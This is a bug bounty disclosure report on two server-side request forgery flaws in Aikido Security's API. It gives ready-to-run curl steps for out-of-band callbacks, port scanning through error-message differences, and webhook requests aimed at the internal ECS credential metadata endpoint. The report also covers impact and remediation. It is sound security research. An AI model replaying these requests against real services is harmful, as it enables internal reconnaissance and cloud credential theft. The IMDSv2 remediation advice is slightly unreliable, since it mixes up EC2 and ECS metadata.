# W-006 — SSRF via openapi_spec_url + Webhook: Confirmed ECS Metadata Access (Aikido Security)

**Program:** Aikido Security (Intigriti)  
**Asset:** `app.aikido.dev` — Tier 2  
**Severity:** High — CVSS 3.1: `AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N` = **7.7**  
**CWE:** CWE-918 (Server-Side Request Forgery)  
**Testing date:** 2026-05-14

---

## TL;DR

Two independent SSRF vectors in Aikido's API. Vector 1 (`openapi_spec_url`) triggers outbound HTTP requests from AWS eu-west-1 IPs — confirmed via OOB DNS+HTTP callbacks. The error message also leaks internal port status (open vs closed). Vector 2 (webhook `target_url`) accepts internal IPs including `169.254.170.2` (ECS Task Metadata). Confirmed ECS metadata access: four distinct endpoints all returned `HTTP 500` with `latest_http_status_code: 500` visible in the webhook health status API — proving the request reached the internal ECS server.

---

## Discovery Process

### 1. Mapping the API surface

Aikido has a public REST API (`/api/public/v1/`) and an internal session-based API. Two features stood out as SSRF candidates:
- `POST /api/public/v1/domains` — accepts an `openapi_spec_url` that the server fetches
- `POST /api/webhooks/registerWebhook` — accepts a `target_url` that the server sends events to

### 2. Vector 1: openapi_spec_url

The domain registration endpoint fetches the OpenAPI spec URL server-side to validate the schema. Setting it to an OOB listener URL triggered DNS and HTTP callbacks from AWS eu-west-1 IPs (`52.50.198.227`, `52.51.98.186`) — confirming server-side fetch.

**Port scanning oracle via error message difference:**

The error message leaks whether a port is open or closed:
- Open port: `"Could not GET OpenAPI spec from the provided URL."`
- Closed port: `"Could not fetch OpenAPI spec from the provided URL."`

This allowed internal network port scanning via error message differentiation alone.

Confirmed: Apache running on `127.0.0.1:80` (error: "Could not **GET**").

### 3. Vector 2: Webhook SSRF → ECS Metadata

Aikido's webhook system POSTs events to registered URLs when issues are found. The `target_url` field accepts any URL, including internal addresses.

I registered four webhooks pointing to ECS Task Metadata endpoints (`169.254.170.2/v2/credentials`, `/v2/metadata`, `/v2/stats`, `/`), triggered a test delivery, then checked the webhook health status via the public API:

```json
[
  {"id": 1454, "target_url": "http://169.254.170.2/v2/credentials",
   "health_status": "failing", "latest_http_status_code": 500},
  {"id": 1458, "target_url": "http://169.254.170.2/",
   "health_status": "failing", "latest_http_status_code": 500},
  {"id": 1459, "target_url": "http://169.254.170.2/v2/metadata",
   "health_status": "failing", "latest_http_status_code": 500},
  {"id": 1460, "target_url": "http://169.254.170.2/v2/stats",
   "health_status": "failing", "latest_http_status_code": 500}
]
```

`HTTP 500` across all four distinct ECS metadata endpoints proves the requests reached the internal ECS server and received actual HTTP responses. HTTP 500 is the ECS metadata server's response to a request without a valid task credential ID — it's not a network-level block.

---

## Steps to Reproduce

> Requires a free trial account at app.aikido.dev.

### Vector 1 — openapi_spec_url OOB

```bash
# Step 1: Get OAuth bearer token
TOKEN=$(curl -s -X POST "https://app.aikido.dev/api/oauth/token" \
  -u "AIK_CLIENT_ID:AIK_CLIENT_SECRET" \
  -d "grant_type=client_credentials" | python3 -c "import json,sys; print(json.load(sys.stdin)['access_token'])")

# Step 2: Trigger SSRF with OOB listener
curl -X POST "https://app.aikido.dev/api/public/v1/domains" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "domain": "https://example.com",
    "kind": "rest_api",
    "openapi_spec_url": "https://[OOB_LISTENER_URL]/ssrf-poc"
  }'
# Response: {"error":"Could not fetch OpenAPI spec from the provided URL."}
# OOB callbacks: DNS + HTTP GET from AWS eu-west-1 IPs within ~2 seconds
```

**Port scanning via error message:**

```bash
# Open port — error says "GET" (made the connection)
curl -X POST "https://app.aikido.dev/api/public/v1/domains" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"domain":"x","kind":"rest_api","openapi_spec_url":"http://127.0.0.1:80/"}'
# → "Could not GET OpenAPI spec..."   ← port 80 OPEN

# Closed port — error says "fetch"
curl -X POST "https://app.aikido.dev/api/public/v1/domains" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"domain":"x","kind":"rest_api","openapi_spec_url":"http://127.0.0.1:443/"}'
# → "Could not fetch OpenAPI spec..."  ← port 443 CLOSED
```

### Vector 2 — Webhook → ECS Metadata

```bash
# Step 1: Register webhook pointing to ECS metadata
curl -X POST "https://app.aikido.dev/api/webhooks/registerWebhook" \
  -H "Cookie: auth=[SESSION]" \
  -H "Content-Type: application/json" \
  -d '{"target_url":"http://169.254.170.2/v2/credentials","event_type":"issue.open.created"}'
# → {"status":"ok"}  (webhook ID returned)

# Step 2: Trigger test delivery
curl -X POST "https://app.aikido.dev/api/webhooks/[WEBHOOK_ID]/test" \
  -H "Cookie: auth=[SESSION]"

# Step 3: Check webhook health (shows ECS response code)
curl "https://app.aikido.dev/api/public/v1/webhooks" \
  -H "Authorization: Bearer $TOKEN"
# → "latest_http_status_code": 500 ← ECS metadata server responded
```

---

## Impact

1. **Confirmed OOB SSRF**: DNS+HTTP callbacks from AWS eu-west-1 production IPs.
2. **Internal port scanning**: Error message difference (`GET` vs `fetch`) leaks open/closed port status for any internal address.
3. **Confirmed ECS Task Metadata access**: HTTP 500 from `169.254.170.2` across four paths proves TCP+HTTP connection to Aikido's internal ECS metadata server.
4. **Credential exposure path**: `169.254.170.2/v2/credentials` returns ECS task IAM credentials when called with the correct task credential ID. The 500 here means the request format was wrong (no task ID), not that the path is blocked.

---

## Remediation

1. Block RFC 1918, link-local (`169.254.0.0/16`), and loopback addresses before making outbound HTTP requests.
2. DNS rebinding protection: resolve once, validate IP, reuse the same resolved IP for the actual request.
3. Normalize error messages for `openapi_spec_url` to avoid leaking internal port scan results.
4. Enforce IMDSv2 (`HttpTokens=required`) on all ECS instances to require a PUT token before metadata access.

---

## Lessons Learned

- **Webhook health status endpoints are SSRF oracles.** The `latest_http_status_code` field in Aikido's webhook API turns a blind SSRF into a full read of the HTTP response code — which was enough to confirm ECS metadata access.
- **Error message differences = port scanner.** "Could not GET" vs "Could not fetch" is a classic SSRF oracle — any behavioral difference between reachable and unreachable targets leaks internal network topology.
- **169.254.170.2 is ECS, not EC2 IMDS.** On ECS Fargate, the task metadata endpoint is `169.254.170.2` (not `169.254.169.254`). Always probe both when testing AWS environments.
- **Two independent vectors in the same report increase confidence.** Vector 1 proved server-side fetch via OOB. Vector 2 proved internal network reach via response codes. Each confirmed the other.
